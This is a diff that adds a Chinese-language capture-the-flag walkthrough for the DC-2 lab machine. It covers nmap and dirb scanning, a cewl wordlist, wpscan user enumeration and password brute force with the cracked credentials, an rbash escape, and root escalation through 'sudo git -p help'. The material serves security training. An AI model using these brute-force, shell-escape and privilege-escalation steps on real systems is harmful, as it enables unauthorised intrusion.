@@ -1,0 +1,59 @@
+扫描发现主机ip并开放了80端口
+nmap -sV 192.168.140.0/24
+
+Nmap scan report for bogon (192.168.140.133)
+Host is up (0.0015s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+
+
+看到开放了80端口，但是打不开网页
+这里被重定向了，添加hosts，在etc/hosts里加入主机和网址访问成功
+拿到flag1,并获得提示使用cewl
+
+这里可以扫一下，看到url就可以扫
+dirb http://dc-2/
+
+
+通过cewl获得信息
+cewl http://dc-2/ -w dc-2dict.txt -v
+
+wpscan 这是专门针对WordPress的漏洞扫描工具
+wpscan --url http://dc-2/ -e u      //枚举用户名字
+这里获得了三个用户名admin、jerry、tom
+
+通过wpscan进行暴力破解
+wpscan --url http://dc-2/ -U wordpass.txt -P dc-2dict.txt
+[SUCCESS] - jerry / adipiscing                                                                 
+[SUCCESS] - tom / parturient  
+成功了两个,登录
+tom@notreallyanywhere.net
+jerry@notreallyanywhere.net
+通过jerry帐号找到flag2
+
+
+提示这里没有信息了，想到了之前信息搜集有开ssh端口
+用jerry帐号密码尝试登录失败，但是tom账户可以登录，并获得flag3,里边不能用cat查看，但是可以用vi
+
+compgen -c       //查看可以使用的指令
+
+绕过rbash
+tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a
+$ export PATH=$PATH:/bin/
+$ export PATH=$PATH:/usr/bin
+
+绕过后cd到jerry目录，发现falg4
+
+根据提示需要用git命令，经过查询发现没有sudo权限
+常识su jerry切换用户输入之前的jerry密码居然可以，并且sudo不需要密码
+将边框变寨，输入sudo git -p help 命令，并在下边输入!bin/bash
+提权成功
+进入root账户看到final-flag.txt
+结束
+
+
+
+
+
+
